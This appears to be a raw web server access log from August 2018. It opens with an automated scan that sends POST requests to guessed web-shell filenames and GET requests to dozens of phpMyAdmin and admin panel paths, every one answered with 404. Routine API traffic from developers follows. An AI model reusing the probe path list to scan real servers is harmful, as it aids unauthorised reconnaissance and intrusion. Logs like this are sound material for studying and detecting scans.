ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:10 +0000] "POST /12.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:10 +0000] "POST /hh.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:10 +0000] "POST /ak.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:11 +0000] "POST /ip.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:11 +0000] "POST /infoo.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:12 +0000] "POST /qq.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:13 +0000] "POST /qwe.php HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:13 +0000] "POST /1213.php HTTP/1.1" 404 465 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:15 +0000] "POST /post.php HTTP/1.1" 404 502 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:15 +0000] "POST /h1.php HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:16 +0000] "POST /test.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:16 +0000] "POST /3.php HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:17 +0000] "POST /phpinfi.php HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:18 +0000] "POST /aaaa.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:18 +0000] "POST /9510.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:19 +0000] "POST /xiaoma.php HTTP/1.1" 404 503 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:19 +0000] "POST /xiaomae.php HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:19 +0000] "POST /xiaomar.php HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:20 +0000] "POST /qq.php HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:20 +0000] "POST /data.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:20 +0000] "POST /log.php HTTP/1.1" 404 500 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:21 +0000] "POST /fack.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:22 +0000] "POST /angge.php HTTP/1.1" 404 502 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:22 +0000] "GET /index.php HTTP/1.1" 404 502 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:23 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 513 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:24 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 513 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:24 +0000] "GET /pmd/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:24 +0000] "GET /pma/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:25 +0000] "GET /PMA/index.php HTTP/1.1" 404 506 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:25 +0000] "GET /PMA2/index.php HTTP/1.1" 404 507 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:26 +0000] "GET /pmamy/index.php HTTP/1.1" 404 508 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:26 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 509 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:27 +0000] "GET /mysql/index.php HTTP/1.1" 404 508 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:27 +0000] "GET /admin/index.php HTTP/1.1" 404 508 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:27 +0000] "GET /db/index.php HTTP/1.1" 404 505 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:27 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 510 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:28 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 517 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:29 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 512 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:29 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 512 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:30 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:30 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 515 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:31 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 519 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:31 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 519 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:31 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 520 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:32 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 513 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:32 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:32 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 511 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:33 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:33 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:34 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:34 +0000] "GET /myadmin/index.php HTTP/1.1" 404 510 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:35 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 511 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:35 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 519 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:36 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 517 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:36 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 517 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:36 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 519 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:37 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 517 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:37 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 516 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:37 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 517 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:38 +0000] "GET /pma-old/index.php HTTP/1.1" 404 510 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:38 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 523 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:38 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 519 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:39 +0000] "GET /phpma/index.php HTTP/1.1" 404 508 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:39 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 524 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 118.24.145.134 - - [28/Aug/2018:09:19:39 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 524 "-" "Mozilla/5.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 125.17.6.141 - - [28/Aug/2018:09:19:53 +0000] "POST /signup/login HTTP/1.1" 500 344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 125.17.6.141 - - [28/Aug/2018:09:19:54 +0000] "POST /signup/login HTTP/1.1" 500 344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 125.17.6.141 - - [28/Aug/2018:09:21:33 +0000] "POST /signup/login HTTP/1.1" 500 344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 125.17.6.141 - - [28/Aug/2018:09:24:04 +0000] "POST /signup/login HTTP/1.1" 500 344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "OPTIONS /survey/total/points HTTP/1.1" 200 225 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "OPTIONS /loyaltyrewards/confirm HTTP/1.1" 200 225 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/userSettings/points" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:34 +0000] "GET /signup/status HTTP/1.1" 401 321 "http://localhost:4200/userSettings/points" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 115.114.47.118 - - [28/Aug/2018:09:24:35 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/userSettings/points" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:24:47 +0000] "GET /property/property_estimate HTTP/1.1" 404 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:27:00 +0000] "POST /signup/login HTTP/1.1" 404 292 "-" "PostmanRuntime/7.1.5"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:27:29 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:27:30 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:27:30 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:27:30 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:27:39 +0000] "POST /settings/faq HTTP/1.1" 401 282 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:27:51 +0000] "POST /signup/login HTTP/1.1" 500 330 "-" "PostmanRuntime/7.1.5"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:27:51 +0000] "GET /transaction/category HTTP/1.1" 404 514 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:35 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:28:35 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:36 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:28:36 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:38 +0000] "POST /signup/login HTTP/1.1" 500 330 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:54 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:54 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:54 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:28:54 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:11 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:11 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:11 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:11 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:12 +0000] "PUT /property/update_property HTTP/1.1" 405 580 "-" "PostmanRuntime/7.2.0"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:33 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:34 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:34 +0000] "GET /signup/status HTTP/1.1" 401 317 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:34 +0000] "GET /settings/profile HTTP/1.1" 401 295 "http://localhost:4200/dashboard/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:42 +0000] "OPTIONS /misc/get/all HTTP/1.1" 200 411 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 203.145.182.245 - - [28/Aug/2018:09:29:43 +0000] "GET /misc/get/all HTTP/1.1" 200 3758 "http://localhost:4200/signUp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:48 +0000] "OPTIONS /signup/register HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 127.0.0.1 - - [28/Aug/2018:09:29:48 +0000] "POST /settings/profile HTTP/1.1" 201 299 "-" "python-requests/2.19.1"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:29:48 +0000] "POST /signup/register HTTP/1.1" 201 1038 "http://localhost:4200/signUp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:11 +0000] "OPTIONS /signup/status HTTP/1.1" 200 416 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
ip-10-0-0-64.ap-southeast-2.compute.internal:80 121.244.36.135 - - [28/Aug/2018:09:30:11 +0000] "OPTIONS /settings/profile HTTP/1.1" 200 422 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
